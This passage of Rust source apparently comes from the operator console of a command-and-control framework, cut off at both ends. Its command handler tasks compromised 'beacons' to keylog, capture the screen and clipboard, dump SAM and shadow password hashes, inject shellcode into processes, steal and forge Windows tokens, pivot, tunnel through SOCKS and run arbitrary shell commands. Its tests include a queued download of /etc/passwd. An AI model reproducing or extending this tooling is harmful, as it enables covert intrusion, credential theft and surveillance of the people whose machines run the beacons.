                    self.log("usage: /use <id-prefix>", Level::Warn);
                    return;
                }
                match self.sessions.iter().position(|s| s.id.starts_with(id)) {
                    Some(i) => {
                        self.selected = Some(i);
                        self.log(
                            &format!("selected beacon {}", short(&self.sessions[i].id)),
                            Level::Ok,
                        );
                    }
                    None => self.log(&format!("! no beacon matching {id}"), Level::Err),
                }
            }
            "/rename" | "/tag" | "/untag" | "/star" | "/note" => {
                self.session_meta_cmd(name, args);
            }
            "/ls" => self.run_parsed_shell(args, "/ls", ShellFor::Ls),
            "/ps" => self.run_parsed_shell(args, "/ps", ShellFor::Ps),
            "/bof" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                let mut parts = args.split_whitespace();
                let file = match parts.next() {
                    Some(f) => f.to_string(),
                    None => {
                        self.log("usage: /bof <file.o> [args]", Level::Warn);
                        return;
                    }
                };
                let bof_args = parts.collect::<Vec<_>>().join(" ");
                let data = match std::fs::read(&file) {
                    Ok(d) => d,
                    Err(e) => {
                        self.log(&format!("! read {file}: {e}"), Level::Err);
                        return;
                    }
                };
                let name = std::path::Path::new(&file)
                    .file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or("bof")
                    .to_string();
                self.log(&format!("[{}] bof {} …", short(&s.id), name), Level::Info);
                self.send(Cmd::Bof {
                    session: s.id,
                    name,
                    args: bof_args,
                    data_hex: hex::encode(&data),
                });
            }
            "/upload" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                let mut parts = args.split_whitespace();
                let local = match parts.next() {
                    Some(l) => l.to_string(),
                    None => {
                        self.log("usage: /upload <local> <remote>", Level::Warn);
                        return;
                    }
                };
                let remote = match parts.next() {
                    Some(r) => r.to_string(),
                    None => {
                        self.log("usage: /upload <local> <remote>", Level::Warn);
                        return;
                    }
                };
                let data = match std::fs::read(&local) {
                    Ok(d) => d,
                    Err(e) => {
                        self.log(&format!("! read {local}: {e}"), Level::Err);
                        return;
                    }
                };
                self.log(
                    &format!("[{}] upload {local} -> {remote}", short(&s.id)),
                    Level::Info,
                );
                self.send(Cmd::Upload {
                    session: s.id,
                    name: remote,
                    data_hex: hex::encode(&data),
                });
            }
            "/download" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                let mut parts = args.split_whitespace();
                let path = match parts.next() {
                    Some(p) => p.to_string(),
                    None => {
                        self.log("usage: /download <remote> [local]", Level::Warn);
                        return;
                    }
                };
                let local = parts.next().map(|s| s.to_string());
                self.log(&format!("[{}] download {path}", short(&s.id)), Level::Info);
                self.send(Cmd::Download {
                    session: s.id,
                    path,
                    local,
                });
            }
            "/sleep" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                match parse_sleep_args(args) {
                    SleepSpec::Seconds(secs) => {
                        self.send(Cmd::Sleep {
                            session: s.id.clone(),
                            seconds: secs,
                            jitter_pct: 0,
                        });
                        self.log(
                            &format!("[{}] tasked sleep {secs}s", short(&s.id)),
                            Level::Info,
                        );
                    }
                    SleepSpec::SecondsJitter(secs, jit) => {
                        self.send(Cmd::Sleep {
                            session: s.id.clone(),
                            seconds: secs,
                            jitter_pct: jit,
                        });
                        self.log(
                            &format!("[{}] tasked sleep {secs}s (±{jit}%)", short(&s.id)),
                            Level::Info,
                        );
                    }
                    SleepSpec::Usage(msg) => self.log(&msg, Level::Warn),
                }
            }
            "/ping" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                self.send(Cmd::Ping { session: s.id });
            }
            "/screenshot" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                let monitor: u8 = args.trim().parse().unwrap_or(0);
                self.log(&format!("[{}] screenshot…", short(&s.id)), Level::Info);
                self.send(Cmd::Screenshot {
                    session: s.id,
                    monitor,
                });
            }
            "/portscan" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                let mut it = args.split_whitespace();
                let host = match it.next() {
                    Some(h) => h.to_string(),
                    None => {
                        self.log("usage: /portscan <host> <ports>", Level::Warn);
                        return;
                    }
                };
                let ports = match it.next() {
                    Some(p) => p.to_string(),
                    None => {
                        self.log("usage: /portscan <host> <ports>", Level::Warn);
                        return;
                    }
                };
                self.send(Cmd::Portscan {
                    session: s.id,
                    host,
                    ports,
                });
            }
            "/net" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                self.send(Cmd::Net {
                    session: s.id,
                    query: args.trim().to_string(),
                });
            }
            "/drive" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                self.send(Cmd::DriveInfo { session: s.id });
            }
            "/clipboard" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                self.send(Cmd::Clipboard { session: s.id });
            }
            "/env" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                self.send(Cmd::Env {
                    session: s.id,
                    name: args.trim().to_string(),
                });
            }
            "/keylog" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                let action = match args.trim() {
                    "start" => 0,
                    "stop" => 1,
                    "dump" | "" => 2,
                    _ => {
                        self.log("usage: /keylog <start|stop|dump>", Level::Warn);
                        return;
                    }
                };
                self.send(Cmd::Keylog {
                    session: s.id,
                    action,
                });
            }
            "/screenwatch" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                let secs: u32 = match args.trim().parse() {
                    Ok(v) if v > 0 => v,
                    _ => {
                        self.log("usage: /screenwatch <secs>", Level::Warn);
                        return;
                    }
                };
                self.send(Cmd::Screenwatch {
                    session: s.id,
                    interval_secs: secs,
                });
            }
            "/hashdump" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                // method 语义（跨后端统一）：0=SAM, 1=SYSTEM, 2=LSASS(deferred),
                // 3=macOS-shadow。默认 sam(0)。`lsass`/`mac` 保留为兼容别名但
                // 映射到正确语义（lsass→2 deferred，mac→3 shadow）。
                let method = match args.trim() {
                    "sam" | "" => 0,
                    "system" => 1,
                    "lsass" => 2,
                    "shadow" | "mac" => 3,
                    other => {
                        self.log(
                            &format!("! unknown hashdump method '{other}': use sam|system|shadow"),
                            Level::Err,
                        );
                        return;
                    }
                };
                self.send(Cmd::Hashdump {
                    session: s.id,
                    method,
                });
            }
            "/getuid" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                self.send(Cmd::GetUid { session: s.id });
            }
            "/inject" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                // /inject <method> <pid|spawn_to> <file.bin>
                let mut parts = args.split_whitespace();
                let method: u8 = match parts.next().and_then(|m| m.parse().ok()) {
                    Some(v) => v,
                    None => {
                        self.log(
                            "usage: /inject <method 0|1|2> <pid|spawn_to> <file>",
                            Level::Warn,
                        );
                        return;
                    }
                };
                let target = parts.next().unwrap_or("").to_string();
                let file = match parts.next() {
                    Some(f) => f.to_string(),
                    None => {
                        self.log("usage: /inject <method> <pid|spawn_to> <file>", Level::Warn);
                        return;
                    }
                };
                let data = match std::fs::read(&file) {
                    Ok(d) => d,
                    Err(e) => {
                        self.log(&format!("! read {file}: {e}"), Level::Err);
                        return;
                    }
                };
                // Parse target: if numeric, it's a pid; otherwise spawn_to name.
                let (pid, spawn_to) = match target.parse::<u32>() {
                    Ok(p) => (p, String::new()),
                    Err(_) => (0, target),
                };
                let sc_hex = hex::encode(&data);
                self.send(Cmd::Inject {
                    session: s.id,
                    method,
                    pid,
                    spawn_to,
                    sc_hex,
                });
            }
            "/steal" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                let pid: u32 = match args.trim().parse() {
                    Ok(v) => v,
                    _ => {
                        self.log("usage: /steal <pid>", Level::Warn);
                        return;
                    }
                };
                self.send(Cmd::StealToken { session: s.id, pid });
            }
            "/make_token" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                // /make_token DOMAIN\user password [logon_type 1|2|3]
                let parts: Vec<&str> = args.split_whitespace().collect();
                if parts.len() < 2 {
                    self.log(
                        "usage: /make_token DOMAIN\\user password [1|2|3]",
                        Level::Err,
                    );
                    return;
                }
                let du = parts[0];
                let (domain, user) = match du.split_once('\\') {
                    Some((d, u)) => (d.to_string(), u.to_string()),
                    None => (String::new(), du.to_string()), // local account
                };
                let password = parts[1].to_string();
                let logon_type = parts.get(2).and_then(|t| t.parse::<u8>().ok()).unwrap_or(1);
                self.send(Cmd::MakeToken {
                    session: s.id,
                    domain,
                    user,
                    password,
                    logon_type,
                });
            }
            "/rev2self" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                self.send(Cmd::Rev2Self { session: s.id });
            }
            "/cd" | "/mkdir" | "/rm" => {
                let (op, path) = self.fileop_one_arg(name, args);
                let Some((s, p)) = path else { return };
                self.send(Cmd::FileOp {
                    session: s.id,
                    op,
                    path: p,
                    dest: None,
                });
            }
            "/mv" | "/cp" => {
                let (op, parts) = self.fileop_two_args(name, args);
                let Some((s, src, dst)) = parts else { return };
                self.send(Cmd::FileOp {
                    session: s.id,
                    op,
                    path: src,
                    dest: Some(dst),
                });
            }
            "/pivot" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                let mut it = args.split_whitespace();
                let host = match it.next() {
                    Some(h) => h.to_string(),
                    None => {
                        self.log("usage: /pivot <host> <port>", Level::Warn);
                        return;
                    }
                };
                let port: u16 = match it.next().and_then(|p| p.parse().ok()) {
                    Some(p) => p,
                    None => {
                        self.log("usage: /pivot <host> <port>", Level::Warn);
                        return;
                    }
                };
                self.send(Cmd::Pivot {
                    session: s.id,
                    host,
                    port,
                });
            }
            "/socks" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                let mut it = args.split_whitespace();
                let chan: u32 = match it.next().and_then(|x| x.parse().ok()) {
                    Some(c) => c,
                    None => {
                        self.log("usage: /socks <chan> <op> <addr> <port>", Level::Warn);
                        return;
                    }
                };
                let op: u8 = match it.next().and_then(|x| x.parse().ok()) {
                    Some(o) => o,
                    None => {
                        self.log("usage: /socks <chan> <op> <addr> <port>", Level::Warn);
                        return;
                    }
                };
                let addr = match it.next() {
                    Some(a) => a.to_string(),
                    None => {
                        self.log("usage: /socks <chan> <op> <addr> <port>", Level::Warn);
                        return;
                    }
                };
                let port: u16 = match it.next().and_then(|p| p.parse().ok()) {
                    Some(p) => p,
                    None => {
                        self.log("usage: /socks <chan> <op> <addr> <port>", Level::Warn);
                        return;
                    }
                };
                self.send(Cmd::Socks {
                    session: s.id,
                    chan,
                    op,
                    addr,
                    port,
                });
            }
            "/kill" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                self.send(Cmd::Exit {
                    session: s.id.clone(),
                });
                self.log(&format!("[{}] tasked exit", short(&s.id)), Level::Warn);
            }
            other => self.log(
                &format!("! unknown command {other} — try /help",),
                Level::Err,
            ),
        }
    }

    /// Run a shell command whose output we parse into a table overlay.
    /// The command text depends on the beacon's OS guess; we pick POSIX by
    /// default (dev agent runs on macOS/Linux) and Windows if the beacon's os
    /// string mentions "windows".
    fn run_parsed_shell(&mut self, args: &str, label: &str, which: ShellFor) {
        let Some(s) = self.current_session().cloned() else {
            self.log("! select a beacon first", Level::Err);
            return;
        };
        let is_windows = s.os.to_ascii_lowercase().contains("windows");
        let (cmd, parse) = match which {
            ShellFor::Ls => {
                let cmd = if is_windows {
                    format!("cmd /c dir {}", args)
                } else {
                    format!("ls -l {}", args)
                };
                (cmd, ParseAs::Files)
            }
            ShellFor::Ps => {
                let cmd = if is_windows {
                    "tasklist /fo csv /nh".to_string()
                } else {
                    "ps aux".to_string()
                };
                (cmd, ParseAs::Procs)
            }
            ShellFor::Creds => {
                // No standard command; operator is expected to have dumped via a
                // BOF. We run the typed args verbatim as a shell command and
                // parse the result.
                (args.to_string(), ParseAs::Creds)
            }
        };
        self.log(
            &format!("[{}] {} $ {}", short(&s.id), label, cmd),
            Level::Info,
        );
        self.send(Cmd::Shell {
            session: s.id,
            args: cmd,
            parse,
        });
    }

    /// 单参数文件操作（cd/mkdir/rm）的参数解析。返回 (op_string, Some((session, path)))。
    fn fileop_one_arg(
        &mut self,
        name: &str,
        args: &str,
    ) -> (String, Option<(SessionView, String)>) {
        let op = name.trim_start_matches('/').to_string();
        let Some(s) = self.current_session().cloned() else {
            self.log("! select a beacon first", Level::Err);
            return (op, None);
        };
        let path = match args.split_whitespace().next() {
            Some(p) => p.to_string(),
            None => {
                self.log(&format!("usage: {name} <path>"), Level::Warn);
                return (op, None);
            }
        };
        (op, Some((s, path)))
    }

    /// 双参数文件操作（mv/cp）的参数解析。返回 (op_string, Some((session, src, dst)))。
    fn fileop_two_args(
        &mut self,
        name: &str,
        args: &str,
    ) -> (String, Option<(SessionView, String, String)>) {
        let op = name.trim_start_matches('/').to_string();
        let Some(s) = self.current_session().cloned() else {
            self.log("! select a beacon first", Level::Err);
            return (op, None);
        };
        let mut it = args.split_whitespace();
        let src = match it.next() {
            Some(p) => p.to_string(),
            None => {
                self.log(&format!("usage: {name} <src> <dst>"), Level::Warn);
                return (op, None);
            }
        };
        let dst = match it.next() {
            Some(p) => p.to_string(),
            None => {
                self.log(&format!("usage: {name} <src> <dst>"), Level::Warn);
                return (op, None);
            }
        };
        (op, Some((s, src, dst)))
    }

    /// 处理 session 元数据命令：/rename /tag /untag /star /note。
    /// id 参数支持前缀匹配（和 /use 一致），找到后改 sessions_meta 并 save。
    fn session_meta_cmd(&mut self, name: &str, args: &str) {
        let mut parts = args.splitn(2, char::is_whitespace);
        let id_prefix = match parts.next() {
            Some(id) if !id.is_empty() => id,
            _ => {
                self.log(&format!("usage: {name} <id-prefix> <value>"), Level::Warn);
                return;
            }
        };
        let value = parts.next().unwrap_or("").trim();
        // 前缀匹配 session id
        let full_id = match self.sessions.iter().find(|s| s.id.starts_with(id_prefix)) {
            Some(s) => s.id.clone(),
            None => {
                self.log(&format!("! no beacon matching {id_prefix}"), Level::Err);
                return;
            }
        };
        match name {
            "/rename" => {
                if value.is_empty() {
                    self.log("usage: /rename <id> <name>", Level::Warn);
                    return;
                }
                self.sessions_meta.rename(&full_id, value);
                self.persist_meta(&full_id, &format!("renamed → {value}"));
            }
            "/tag" => {
                if value.is_empty() {
                    self.log("usage: /tag <id> <tag>", Level::Warn);
                    return;
                }
                self.sessions_meta.tag(&full_id, value);
                self.persist_meta(&full_id, &format!("+tag {value}"));
            }
            "/untag" => {
                if value.is_empty() {
                    self.log("usage: /untag <id> <tag>", Level::Warn);
                    return;
                }
                self.sessions_meta.untag(&full_id, value);
                self.persist_meta(&full_id, &format!("-tag {value}"));
            }
            "/star" => {
                self.sessions_meta.toggle_star(&full_id);
                let m = self.sessions_meta.get(&full_id);
                let msg = if m.favorite {
                    "★ starred"
                } else {
                    "unstarred"
                };
                self.persist_meta(&full_id, msg);
            }
            "/note" => {
                if value.is_empty() {
                    self.log("usage: /note <id> <text>", Level::Warn);
                    return;
                }
                self.sessions_meta.note(&full_id, value);
                self.persist_meta(&full_id, "note saved");
            }
            _ => {}
        }
    }

    /// sessions_meta 变更后保存 + 日志确认。
    fn persist_meta(&mut self, id: &str, msg: &str) {
        match self.sessions_meta.save() {
            Ok(()) => self.log(&format!("[{}] {msg}", short(id)), Level::Ok),
            Err(e) => self.log(&format!("! save sessions_meta: {e}"), Level::Err),
        }
    }
}

enum ShellFor {
    Ls,
    Ps,
    Creds,
}

pub(super) fn short(s: &str) -> String {
    s.chars().take(8).collect()
}

/// 把秒数格式化成紧凑时长：`1h02m` / `3m10s` / `45s` / `0s`。
pub(super) fn fmt_age(secs: u64) -> String {
    let h = secs / 3600;
    let m = (secs % 3600) / 60;
    let s = secs % 60;
    if h > 0 {
        format!("{h}h{m:02}m")
    } else if m > 0 {
        format!("{m}m{s:02}s")
    } else {
        format!("{s}s")
    }
}

/// 在拓扑图里显示节点的短标签（label 或 id 前 8 字符）。
pub(super) fn short_topo(topo: &topology::Topology, id: &str) -> String {
    topo.nodes
        .iter()
        .find(|n| n.id == id)
        .map(|n| n.label.clone())
        .unwrap_or_else(|| short(id))
}

// ---- entry -----------------------------------------------------------------

pub fn run(server: &str, token: Option<&str>) -> anyhow::Result<()> {
    enable_raw_mode()?;
    let mut stdout = stdout();
    execute!(stdout, EnterAlternateScreen, EnableMouseCapture)?;
    let backend = CrosstermBackend::new(stdout);
    let mut terminal = Terminal::new(backend)?;

    let bridge = rest::spawn(server.to_string(), token.map(|t| t.to_string()));
    let mut app = App::new(bridge);

    let result = main_loop(&mut terminal, &mut app);

    // restore
    disable_raw_mode()?;
    execute!(
        terminal.backend_mut(),
        LeaveAlternateScreen,
        DisableMouseCapture
    )?;
    terminal.show_cursor()?;
    result
}

fn main_loop(
    terminal: &mut Terminal<CrosstermBackend<io::Stdout>>,
    app: &mut App,
) -> anyhow::Result<()> {
    while !app.should_quit {
        terminal.draw(|f| render(app, f))?;
        // poll input at 100ms cadence so we can also drain worker snapshots
        if event::poll(Duration::from_millis(100))? {
            match event::read()? {
                Event::Key(key) => app.handle_key(key),
                Event::Mouse(ev) => app.handle_mouse(ev),
                // Resize events just force a redraw next iteration (draw is at
                // the top of the loop); nothing else to do.
                Event::Resize(_, _) => {}
                _ => {}
            }
        }
        app.poll_worker();
    }
    let _ = app.bridge.cmds.send(Cmd::Shutdown);
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use input::{classify, mask};

    // ---- classify (pure) ----

    #[test]
    fn classify_empty_is_empty() {
        assert_eq!(classify(""), Input::Empty);
        assert_eq!(classify("   "), Input::Empty);
    }

    #[test]
    fn classify_plain_is_shell() {
        assert_eq!(classify("whoami"), Input::Shell("whoami".into()));
        assert_eq!(classify("  ls -la  "), Input::Shell("ls -la".into()));
    }

    #[test]
    fn classify_slash_is_meta_split() {
        assert_eq!(
            classify("/use abc123"),
            Input::Meta {
                name: "/use".into(),
                args: "abc123".to_string()
            }
        );
        assert_eq!(
            classify("/LS /tmp"),
            Input::Meta {
                name: "/ls".into(),
                args: "/tmp".to_string()
            }
        );
    }

    #[test]
    fn classify_meta_no_args() {
        assert_eq!(
            classify("/ps"),
            Input::Meta {
                name: "/ps".into(),
                args: String::new()
            }
        );
    }

    // ---- filter_meta (pure) ----

    #[test]
    fn filter_empty_returns_all() {
        assert_eq!(filter_meta("").len(), META_COMMANDS.len());
    }

    #[test]
    fn filter_slash_returns_all() {
        assert_eq!(filter_meta("/").len(), META_COMMANDS.len());
    }

    #[test]
    fn filter_prefix_matches_subset() {
        let got = filter_meta("/l");
        let names: Vec<&str> = got.iter().map(|m| m.name).collect();
        assert_eq!(names, vec!["/ls"]);
    }

    #[test]
    fn filter_unknown_returns_empty() {
        assert!(filter_meta("/zzz").is_empty());
    }

    // ---- popup selection movement (pure) ----

    #[test]
    fn popup_move_down_increments() {
        // mid-list: 0 → 1 → 2
        assert_eq!(move_popup_selection(5, Some(0), PopupMove::Down), Some(1));
        assert_eq!(move_popup_selection(5, Some(1), PopupMove::Down), Some(2));
    }

    #[test]
    fn popup_move_down_wraps_to_top() {
        // at last index → wraps to 0
        assert_eq!(move_popup_selection(5, Some(4), PopupMove::Down), Some(0));
    }

    #[test]
    fn popup_move_up_decrements() {
        assert_eq!(move_popup_selection(5, Some(3), PopupMove::Up), Some(2));
    }

    #[test]
    fn popup_move_up_wraps_to_bottom() {
        // at 0 → wraps to last index
        assert_eq!(move_popup_selection(5, Some(0), PopupMove::Up), Some(4));
    }

    #[test]
    fn popup_move_none_current_defaults_to_first() {
        assert_eq!(move_popup_selection(3, None, PopupMove::Down), Some(1));
    }

    #[test]
    fn popup_move_empty_list_is_none() {
        assert_eq!(move_popup_selection(0, None, PopupMove::Down), None);
        assert_eq!(move_popup_selection(0, Some(0), PopupMove::Up), None);
    }

    #[test]
    fn popup_move_single_item_stays() {
        assert_eq!(move_popup_selection(1, Some(0), PopupMove::Down), Some(0));
        assert_eq!(move_popup_selection(1, Some(0), PopupMove::Up), Some(0));
    }

    // ---- popup submit resolution (pure) ----

    #[test]
    fn popup_submit_explicit_selection_wins() {
        // /sl 唯一匹配 /sleep，显式选中 index 0 必须返回 "/sleep"（精确断言）
        assert_eq!(popup_submit_target("/sl", Some(0)), Some("/sleep"));
    }

    #[test]
    fn popup_submit_selection_returns_exact_command() {
        // 用唯一前缀 + 显式选中，锁死具体返回值（不依赖数组顺序）
        let target = popup_submit_target("/ta", Some(0));
        assert_eq!(target, Some("/tag"));
    }

    #[test]
    fn popup_submit_unique_prefix_auto_resolves() {
        // "/ls" only matches /ls → resolves even without selection.
        assert_eq!(popup_submit_target("/ls", None), Some("/ls"));
    }

    #[test]
    fn popup_submit_ambiguous_without_selection_is_none() {
        // "/s" matches several; no selection → can't resolve.
        let filtered = filter_meta("/s");
        assert!(
            filtered.len() > 1,
            "test precondition: /s should be ambiguous"
        );
        assert_eq!(popup_submit_target("/s", None), None);
    }

    #[test]
    fn popup_submit_non_command_input_is_none() {
        // plain shell text, no popup context
        assert_eq!(popup_submit_target("whoami", None), None);
    }

    // ---- scroll (pure) ----

    #[test]
    fn scroll_up_increases_offset() {
        assert_eq!(apply_scroll(0, ScrollDir::Up, 3), 3);
        assert_eq!(apply_scroll(5, ScrollDir::Up, 3), 8);
    }

    #[test]
    fn scroll_down_decreases_offset_toward_zero() {
        assert_eq!(apply_scroll(5, ScrollDir::Down, 3), 2);
    }

    #[test]
    fn scroll_down_clamps_at_zero() {
        // can't go below 0 (stays pinned to the latest / live-tail)
        assert_eq!(apply_scroll(2, ScrollDir::Down, 10), 0);
        assert_eq!(apply_scroll(0, ScrollDir::Down, 5), 0);
    }

    #[test]
    fn scroll_up_saturates_instead_of_overflowing() {
        assert_eq!(apply_scroll(usize::MAX, ScrollDir::Up, 1), usize::MAX);
    }

    // ---- mask ----

    #[test]
    fn mask_short_is_all_dots() {
        assert_eq!(mask("ab"), "••••");
        assert_eq!(mask("abcd"), "••••");
    }

    #[test]
    fn mask_long_keeps_ends() {
        assert_eq!(mask("hunter2"), "hu••••r2");
    }

    // ---- short (pure) ----

    #[test]
    fn short_ascii_takes_8() {
        assert_eq!(short("a1b2c3d4e5f6"), "a1b2c3d4");
    }

    #[test]
    fn short_short_string_unchanged() {
        assert_eq!(short("abc"), "abc");
    }

    #[test]
    fn short_non_ascii_no_panic() {
        // 中文：每个字符是多字节，chars().take(8) 按字符不截断 UTF-8
        let cn = short("这是中文的会话标识符测试");
        assert!(cn.chars().count() <= 8);
        // emoji
        let em = short("🔑🎯🚀💻📦🔧🔨⚡🎉");
        assert!(em.chars().count() <= 8);
        // 不 panic 就是关键（字节切片会崩）
    }

    // ---- parse_sleep_args (pure) ----

    #[test]
    fn sleep_seconds_only() {
        assert!(matches!(parse_sleep_args("5"), SleepSpec::Seconds(5)));
    }

    #[test]
    fn sleep_seconds_and_jitter() {
        assert!(matches!(
            parse_sleep_args("5 20%"),
            SleepSpec::SecondsJitter(5, 20)
        ));
    }

    #[test]
    fn sleep_jitter_without_percent_sign() {
        assert!(matches!(
            parse_sleep_args("5 20"),
            SleepSpec::SecondsJitter(5, 20)
        ));
    }

    #[test]
    fn sleep_missing_seconds_is_usage() {
        assert!(matches!(parse_sleep_args(""), SleepSpec::Usage(_)));
        assert!(matches!(parse_sleep_args("abc"), SleepSpec::Usage(_)));
    }

    #[test]
    fn sleep_bad_jitter_is_usage() {
        assert!(matches!(parse_sleep_args("5 xyz"), SleepSpec::Usage(_)));
    }

    #[test]
    fn sleep_jitter_clamped_to_100() {
        match parse_sleep_args("5 999") {
            SleepSpec::SecondsJitter(_, j) => assert_eq!(j, 100),
            other => panic!("expected SecondsJitter, got {other:?}"),
        }
    }

    // ---- render smoke tests (TestBackend; prove draw never panics) ----

    use ratatui::backend::TestBackend;
    use ratatui::Terminal;

    /// Build an App with a fake pair of unconnected channels (no worker thread).
    fn fake_app() -> App {
        let (snap_tx, snap_rx) = std::sync::mpsc::channel();
        let (cmd_tx, cmd_rx) = std::sync::mpsc::channel();
        // drop the senders so try_recv always returns Empty (worker absent).
        drop(snap_tx);
        drop(cmd_rx);
        App::new(Bridge {
            snapshots: snap_rx,
            cmds: cmd_tx,
        })
    }

    #[test]
    fn render_does_not_panic_empty() {
        let mut app = fake_app();
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
    }

    #[test]
    fn render_does_not_panic_with_stream_and_popup() {
        let mut app = fake_app();
        app.connected = true;
        app.log("[a1b2c3] $ whoami", Level::Info);
        app.log("DEV\\alice", Level::Ok);
        app.log("! some error", Level::Err);
        app.input = "/l".into();
        app.popup_open = true;
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
    }

    #[test]
    fn render_does_not_panic_with_files_overlay() {
        let mut app = fake_app();
        app.overlay = Overlay::Files(vec![
            FileEntry {
                name: "notes.txt".into(),
                size: 1234,
                is_dir: false,
                modified: "May 21".into(),
            },
            FileEntry {
                name: "sub".into(),
                size: 0,
                is_dir: true,
                modified: "May 21".into(),
            },
        ]);
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
    }

    #[test]
    fn render_does_not_panic_with_sessions_overlay() {
        use crate::types::SessionView;
        let mut app = fake_app();
        app.sessions = vec![SessionView {
            id: "a1b2c3d4e5f6".into(),
            hostname: "host01".into(),
            username: "alice".into(),
            os: "macos".into(),
            is_admin: 1,
            pending: 0,
            beacon_id: 7,
            arch: 4,
            pid: 1234,
            ..Default::default()
        }];
        app.selected = Some(0);
        let mut st = ListState::default();
        st.select(Some(0));
        app.overlay = Overlay::Sessions(st);
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
    }

    #[test]
    fn age_for_returns_baseline_when_just_recorded() {
        // 客户端推算：刚记下的基线 (now, 100)，elapsed≈0 → age_for 仍为 100。
        let mut app = fake_app();
        app.age_baseline
            .insert("a1b2c3d4".into(), (Instant::now(), 100));
        assert_eq!(app.age_for("a1b2c3d4"), 100);
    }

    #[test]
    fn age_for_returns_zero_for_unknown_session() {
        // 没有基线的会话 → 0（不会 panic）。
        let app = fake_app();
        assert_eq!(app.age_for("never-seen"), 0);
    }

    #[test]
    fn fmt_age_formats_compactly() {
        assert_eq!(fmt_age(0), "0s");
        assert_eq!(fmt_age(45), "45s");
        assert_eq!(fmt_age(190), "3m10s");
        assert_eq!(fmt_age(3725), "1h02m");
    }

    #[test]
    fn render_does_not_panic_with_session_detail_overlay() {
        // /info 详情 overlay——覆盖 ja3/ja4/pid/pending/age + 本地 meta 的渲染路径。
        use crate::types::SessionView;
        let mut app = fake_app();
        app.sessions = vec![SessionView {
            id: "a1b2c3d4e5f6".into(),
            hostname: "host01".into(),
            username: "alice".into(),
            os: "macos".into(),
            is_admin: 1,
            pending: 2,
            beacon_id: 7,
            arch: 4,
            pid: 1234,
            ja3: Some("e7d705a3286e19ea42f587b344ee6865".into()),
            ja4: Some("t13d0400_002b_c8dd0a8e8c9b".into()),
            ..Default::default()
        }];
        app.age_baseline
            .insert("a1b2c3d4e5f6".into(), (Instant::now(), 300));
        app.overlay = Overlay::SessionDetail("a1b2c3d4e5f6".into());
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
    }

    #[test]
    fn render_does_not_panic_with_tasks_overlay() {
        // /tasks 排队任务 overlay。
        let mut app = fake_app();
        app.overlay = Overlay::Tasks(vec![
            crate::rest::TaskRow {
                task_id: 42,
                command: serde_json::json!({"type": "shell", "args": "whoami"}),
            },
            crate::rest::TaskRow {
                task_id: 43,
                command: serde_json::json!({"type": "download", "path": "/etc/passwd"}),
            },
        ]);
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
    }

    #[test]
    fn render_does_not_panic_with_procs_and_creds_overlay() {
        let mut app = fake_app();
        app.overlay = Overlay::Procs(vec![ProcEntry {
            pid: 1,
            ppid: 0,
            name: "launchd".into(),
            user: "root".into(),
        }]);
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();

        app.overlay = Overlay::Creds(vec![CredEntry {
            source: "DEV".into(),
            principal: "alice".into(),
            kind: crate::types::CredKind::Hash,
            secret: "8846f7".into(),
        }]);
        term.draw(|f| render(&mut app, f)).unwrap();
    }

    #[test]
    fn render_does_not_panic_with_split_panes() {
        // tmux 式分屏：Ctrl+% 后两个窗格，渲染不崩
        let mut app = fake_app();
        app.pane_tree = panes::Pane::single(1).split(1, panes::SplitDir::Vertical);
        app.focused_pane = 101;
        app.log("[a1b2c3] $ whoami", Level::Info);
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
    }

    #[test]
    fn render_does_not_panic_with_different_pane_views() {
        // 焦点窗格切换为 Files 视图，渲染不崩
